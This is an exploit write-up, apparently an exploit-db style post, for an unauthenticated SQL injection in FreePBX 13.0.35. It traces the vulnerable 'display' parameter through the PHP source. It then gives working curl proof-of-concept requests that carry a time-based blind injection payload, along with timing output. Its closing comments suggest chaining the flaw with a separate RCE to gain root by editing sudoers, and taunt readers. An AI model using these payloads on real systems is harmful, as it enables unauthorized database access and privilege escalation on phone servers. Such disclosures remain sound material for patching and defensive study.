Tested version : 13.0.35
vendor : freepbx.org
Author : i-Hmx
Email : n0p1337@gmail.com
Home : sec4ever.com
 
Freepbx suffer from unauthenticated sql injection flaw due to insufficient sanitization of "display" parameter
  
File : admin/libraries/DB.class.php
    public function getAll($sql,$params=array(),$fetchmode=DB_FETCHMODE_DEFAULT) {
        //this is a sad workaround for people who couldn&#039;t follow documentation for functions
        $fetchmode = $this->isFetchMode($params) ? $params : $fetchmode;
        self::$error = null;
        try {
            $fetch = $this->correctFetchMode($fetchmode);
            if(!empty($params) && is_array($params)) {
    ------->>>>> $this->res->execute($params);
                return $this->res->fetchAll($fetch);
            }
            $this->res = $this->db->query($sql);
            if($this->res === false) {
                return false;
            }
            return $this->res->fetchAll($fetch);
        } catch (Exception $e) {
            return new DB_Error($e);
        }
    }
 
File : admin/libraries/modulefunctions.class.php
Line 593
        function getinfo($module = false, $status = false, $forceload = false) {
 
        global $amp_conf, $db;
        $modules = array();
 
        if ($module) {
            // get info on only one module
            $xml = $this->_readxml($module);
            if (!is_null($xml)) {
                $modules[$module] = $xml;
                // if status is anything else, it will be updated below when we read the db
                $modules[$module][&#039;status&#039;] = MODULE_STATUS_NOTINSTALLED;
            }
 
            // query to get just this one
    ---===>>>> $sql = &#039;SELECT * FROM modules WHERE modulename = "&#039;.$module.&#039;"&#039;;
        }
        if ($module || !$modulelist->is_loaded()) {
    ---===>>>$results = $db->getAll($sql,DB_FETCHMODE_ASSOC);
            if(DB::IsError($results)) {
                die_freepbx($sql."<br>\n".$results->getMessage());
            }
        
File : admin/libraries/modulefunctions.legacy.php
Line 52
        function module_getinfo($module = false, $status = false, $forceload = false) {
            _module_backtrace();
            $modulef = module_functions::create();
        ---===>>> return $modulef->getinfo($module, $status, $forceload);
        }
 
File : admin/views/noaccess.php
        <?php
        $display = isset($_REQUEST[&#039;display&#039;])?$_REQUEST[&#039;display&#039;]:false;
    ---===>>> $modinfo = \module_getinfo($display);
 
 
POC :
 
Normal request
 
[root:/fpbx]# curl -o /dev/null -s -w "Total request time : %{time_connect} + %{time_starttransfer} =  %{time_total}\n" &#039;http://x.x.x.x/admin/config.php?display=f4ris&#039;
Total request time : 0.001 + 0.309 =  0.334
 
Sql injected
 
[root:/fpbx]# curl -o /dev/null -s -w "Total request time : %{time_connect} + %{time_starttransfer} =  %{time_total}\n" &#039;http://x.x.x.x/admin/config.php?display=f4ris"XOR(if(6661=6661,sleep(0.03),0))OR"*/&#039;
Total request time : 0.158 + 4.391 =  4.417
 
# Mix this with the 13.0.35 RCE one , and you are ok to get root just by echoing asterisk to the sudoers ;)
# We&#039;re still ruling the game idiots , from Eg-R1z with dust xDD
# ./f4ris

